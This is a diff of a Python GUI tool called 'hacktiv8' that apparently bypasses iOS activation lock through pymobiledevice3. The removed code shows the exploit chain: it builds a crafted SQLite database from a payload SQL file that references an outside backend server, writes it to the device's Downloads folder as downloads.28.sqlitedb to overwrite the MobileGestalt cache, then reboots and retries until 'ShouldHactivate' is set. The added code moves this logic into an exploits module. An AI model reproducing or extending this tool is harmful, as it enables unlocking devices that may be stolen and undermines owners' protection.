@@ -1,10 +1,4 @@
 import sys
-import os
-import time
-import sqlite3
-import tempfile
-
-import requests
 
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QWidget,
@@ -13,83 +7,16 @@ from PyQt5.QtWidgets import (
 from PyQt5.QtCore import QThread, pyqtSignal, QTimer
 
 from pymobiledevice3.lockdown import create_using_usbmux
-from pymobiledevice3.services.afc import AfcService
-from pymobiledevice3.services.diagnostics import DiagnosticsService
 
+from exploits import get_exploit
+from exploits.common import parse_version
+from exploits.itunesstored.itunesstored import ItunesstoredExploit
 
-BACKEND_URL = 'http://overcast302.dev/hacktiv8/server.php'
-
-# pyinstaller resource path fix
-def resource_path(name):
-    base = getattr(sys, '_MEIPASS', os.path.abspath('.'))
-    return os.path.join(base, name)
-
-def build_db_from_sql(sql_path, backend_url, target_path):
-    with open(sql_path, 'r', encoding='utf-8') as f:
-        sql = f.read()
-
-    sql = sql.replace('BACKEND_URL', backend_url).replace('TARGET_PATH', target_path)
-
-    tmp = tempfile.NamedTemporaryFile(delete=False)
-    tmp.close()
-
-    try:
-        con = sqlite3.connect(tmp.name)
-        con.executescript(sql)
-        con.commit()
-        con.close()
-
-        with open(tmp.name, 'rb') as f:
-            return f.read()
-    finally:
-        os.unlink(tmp.name)
-
-def query_support(product, build):
-    resp = requests.get(
-        BACKEND_URL,
-        params={'support_query': '1', 'model': product, 'build': build},
-        timeout=10,
-    )
-    return resp.json().get('supported', False)
 
 class ActivationThread(QThread):
     status = pyqtSignal(str)
     success = pyqtSignal(str)
     error = pyqtSignal(str)
-
-    def wait_for_device(self, timeout=160):
-        deadline = time.monotonic() + timeout
-
-        while time.monotonic() < deadline:
-            try:
-                lockdown = create_using_usbmux()
-                DiagnosticsService(lockdown=lockdown).mobilegestalt(
-                    keys=['ProductType']
-                )
-                return lockdown
-            except Exception:
-                time.sleep(2)
-
-        raise TimeoutError()
-
-    def push_payload(self, lockdown, payload_db):
-        with AfcService(lockdown=lockdown) as afc:
-            for filename in afc.listdir('Downloads'):
-                afc.rm('Downloads/' + filename)
-            time.sleep(3)
-
-            afc.set_file_contents(
-                'Downloads/downloads.28.sqlitedb',
-                payload_db
-            )
-        DiagnosticsService(lockdown=lockdown).restart()
-        return self.wait_for_device()
-
-    def should_hactivate(self, lockdown):
-        diag = DiagnosticsService(lockdown=lockdown)
-        return diag.mobilegestalt(
-            keys=['ShouldHactivate']
-        ).get('ShouldHactivate')
 
     def run(self):
         try:
@@ -100,31 +27,14 @@ class ActivationThread(QThread):
                 self.success.emit('Device is already activated')
                 return
 
-            sql_path = resource_path('payload.sql')
-            if tuple(int(x) for x in values.get('ProductVersion').split('.')) >= (10, 3):
-                payload_db = build_db_from_sql(sql_path, BACKEND_URL, '/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist')
-            else:
-                payload_db = build_db_from_sql(sql_path, BACKEND_URL, '/private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist')
+            exploit_cls = get_exploit(parse_version(values.get('ProductVersion')), lockdown.udid)
+            if exploit_cls is None:
+                self.error.emit('Unsupported iOS version')
+                return
 
             self.status.emit('Activating device...')
-
-            for attempt in range(5):
-                lockdown = self.push_payload(lockdown, payload_db)
-
-                delay = 15 + attempt * 5
-                time.sleep(delay)
-
-                if self.should_hactivate(lockdown):
-                    DiagnosticsService(lockdown=lockdown).restart()
-                    self.success.emit('Done!')
-                    return
-
-                self.status.emit(f'Retrying activation\nAttempt {attempt + 1}/5')
-                time.sleep(5)
-
-            self.error.emit(
-                'Activation failed after multiple attempts. Make sure the target device is connected to the Wi-Fi.'
-            )
+            exploit_cls(log=self.status.emit).run(lockdown)
+            self.success.emit('Done!')
 
         except TimeoutError:
             self.error.emit(
@@ -138,10 +48,10 @@ class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
 
-        self.setWindowTitle('hacktiv8 v1.1.2')
+        self.setWindowTitle('hacktiv8 v1.2.0')
         self.setFixedSize(500, 200)
 
-        self.support_cache = {}
+        self.version = (0,)
 
         self.status = QLabel('No device connected')
         self.activate = QPushButton('Activate Device')
@@ -169,22 +79,27 @@ class MainWindow(QMainWindow):
             product = values.get('ProductType')
             version = values.get('ProductVersion')
             build = values.get('BuildVersion')
+            version_tuple = parse_version(version)
+            exploit_cls = get_exploit(version_tuple, lockdown.udid)
         except Exception:
             self._set_state('No device connected', False)
             return
 
-        key = (product, build)
-        if key not in self.support_cache:
-            try:
-                self.support_cache[key] = query_support(product, build)
-            except Exception:
-                self._set_state('Could not reach backend. Please check your internet connection!', False)
-                return
-
-        if not self.support_cache[key]:
+        if exploit_cls is None:
             self._set_state(f'Unsupported {product} iOS version: {version}', False)
             return
 
+        try:
+            supported = exploit_cls.available(product, build, lockdown.udid)
+        except Exception:
+            self._set_state('Could not reach backend. Please check your internet connection!', False)
+            return
+
+        if not supported:
+            self._set_state(exploit_cls.unavailable.format(product=product, version=version), False)
+            return
+
+        self.version = version_tuple
         self._set_state(f'Connected: {product} ({version})', True)
 
     def _set_state(self, text, enabled):
@@ -192,10 +107,14 @@ class MainWindow(QMainWindow):
         self.activate.setEnabled(enabled)
 
     def start_activation(self):
+        if ItunesstoredExploit.supports(self.version):
+            note = 'Please ensure it is connected to Wi-Fi.'
+        else:
+            note = 'Your device will reboot during the process.'
         QMessageBox.information(
             self,
             'Info',
-            'Your device will now be activated. Please ensure it is connected to Wi-Fi.'
+            'Your device will now be activated. ' + note
         )
 
         self.timer.stop()
